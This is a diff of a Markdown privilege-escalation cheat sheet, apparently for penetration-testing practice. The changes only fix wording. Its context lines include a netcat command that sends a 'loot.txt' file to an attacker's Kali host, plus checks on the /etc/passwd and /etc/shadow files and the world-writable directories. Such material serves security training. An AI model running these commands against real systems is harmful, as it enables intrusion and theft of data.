@@ -93,7 +93,7 @@ nc <kali ip> 80 < loot.txt
 -------------------
 ## Checking for the Quick Wins
 
-1) The first few commands you SHOULD ALWAYS RUN in this:
+1) The first few commands you SHOULD ALWAYS RUN is this:
 
 ```bash
 # check your group
@@ -126,7 +126,7 @@ ls -la /etc/passwd /etc/shadow  # might as well see if you can write to passwd o
 ls -laRH /home
 ```
 
-3) The third thing you should do is to enumerate the world writable directories. Any thing inside that is not the default files should be investigated.
+3) The third thing you should do is to enumerate the world writable directories. Any thing inside that is not default should be investigated.
 
 ```bash
 ls -la /tmp /opt /dev/shm /var/tmp
